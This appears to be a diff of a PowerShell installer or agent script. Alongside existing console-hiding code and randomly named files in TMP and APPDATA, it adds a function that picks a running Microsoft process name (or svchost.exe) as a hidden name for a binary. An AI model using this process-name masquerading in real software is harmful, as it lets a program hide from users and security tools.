@@ -94,6 +94,23 @@ function Hide-Console
   [Console.Window]::ShowWindow($consolePtr, 0)
 }
 
+function Get-RandomProcessName {
+  # Get the list of all running processes
+  $processes = Get-Process
+    
+  # Filter the processes to only include those with 'Microsoft' in their company name
+  $microsoftProcesses = $processes | Where-Object { $_.Company -like "*Microsoft*" }
+    
+  # Check if there are any Microsoft processes running
+  if ($microsoftProcesses.Count -eq 0) {
+    return "svchost.exe"
+  }
+  # Select a random process from the list of Microsoft processes
+  $randomProcess = $microsoftProcesses | Get-Random
+    
+  # Return the name of the random Microsoft process
+  return $randomProcess.Name + ".exe"
+}
 
 function Is-Administrator  
 {  
@@ -205,6 +222,7 @@ if ($env:DEBUG) {
   Print-Debug "Error Logs: $ERR_LOGS"
 }
 $SECRET=$Env:S
+$QS_BIN_HIDDEN_NAME = Get-RandomProcessName
 $RAND_NAME= -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
 $SECRET_FILE= Join-Path -Path "$env:TMP" -ChildPath "$RAND_NAME.txt"
 $QS_DIR= Join-Path -Path "$env:APPDATA" -ChildPath "$RAND_NAME" 
